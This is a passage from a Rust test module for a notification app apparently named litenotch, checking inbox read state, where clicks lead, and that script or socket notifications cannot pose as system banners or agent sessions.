            &json!({"hook_event_name":"Stop","session_id":"s8","cwd":"/w/web"}).to_string(),
            T0 + 2,
        );
        cmd(&mut c, Command::TimerSet { secs: 1 }, T0 + 2);
        cmd(&mut c, Command::TimerToggle, T0 + 2);
        c.apply(Input::Tick, T0 + 5_000);
        let v = c.view(T0 + 5_000);
        let by = |src: &str, title: &str| {
            v.inbox
                .history
                .iter()
                .find(|n| n.source == src && n.title.contains(title))
                .unwrap()
                .open
                .clone()
        };
        assert_eq!(
            by("agent", "web"),
            Some(OpenTarget::Tab {
                tab: "agents".into(),
                pane: Some("sessions".into())
            })
        );
        assert_eq!(
            by("timer", "Timer"),
            Some(OpenTarget::Tab {
                tab: "timer".into(),
                pane: Some("countdown".into())
            })
        );
    }

    #[test]
    fn socket_notifications_cannot_pose_as_another_apps_banner() {
        let mut c = core();
        c.apply(
            Input::ExternalNotify(NotificationInput {
                group: Some(format!("{SYSTEM_GROUP}1")),
                ..note("spoof", Priority::Normal)
            }),
            T0,
        );
        let v = c.view(T0);
        assert_eq!(v.inbox.banner.as_ref().unwrap().title, "spoof");
        assert_eq!(v.inbox.banner.unwrap().open, None);
    }

    #[test]
    fn opening_a_notification_marks_only_it_read() {
        let mut c = core();
        // Both stay unread: the first shows as a banner, the second waits.
        c.apply(Input::ExternalNotify(note("first", Priority::Normal)), T0);
        c.apply(
            Input::ExternalNotify(note("second", Priority::Normal)),
            T0 + 1,
        );
        let v = c.view(T0 + 1);
        assert_eq!(v.inbox.unread, 2);
        let first = v
            .inbox
            .history
            .iter()
            .find(|n| n.title == "first")
            .unwrap()
            .id;
        cmd(&mut c, Command::NotifyOpened { id: first }, T0 + 2);
        let v = c.view(T0 + 2);
        assert_eq!(v.inbox.unread, 1);
        assert!(v.inbox.history.iter().find(|n| n.id == first).unwrap().read);
        assert!(
            !v.inbox
                .history
                .iter()
                .find(|n| n.title == "second")
                .unwrap()
                .read
        );
        cmd(&mut c, Command::NotifyOpened { id: 9_999 }, T0 + 3);
        assert_eq!(c.view(T0 + 3).inbox.unread, 1);
    }

    #[test]
    fn scripts_cannot_pose_as_litenotch_or_an_agent() {
        let mut c = core();
        c.apply(
            Input::ExternalNotify(NotificationInput {
                source: "agent".into(),
                group: Some("agent-s1".into()),
                ..note("fake", Priority::Normal)
            }),
            T0,
        );
        let n = c.view(T0).inbox.banner.unwrap();
        assert_eq!(n.source, "agent (script)");
        assert_eq!(n.open, None, "a click does not go to a session's terminal");
        c.apply(
            Input::OwnNotify(NotificationInput {
                source: "litenotch".into(),
                ..note("own", Priority::High)
            }),
            T0 + 1,
        );
        assert!(c
            .view(T0 + 1)
            .inbox
            .history
            .iter()
            .any(|n| n.source == "litenotch" && n.title == "own"));
    }

    #[test]
    fn the_status_line_state_is_shown() {
        let mut c = core();
        assert_eq!(c.view(T0).agents.statusline_installed, None);
        c.apply(Input::StatuslineInstalled(Some(true)), T0);
        assert_eq!(c.view(T0).agents.statusline_installed, Some(true));
    }
}
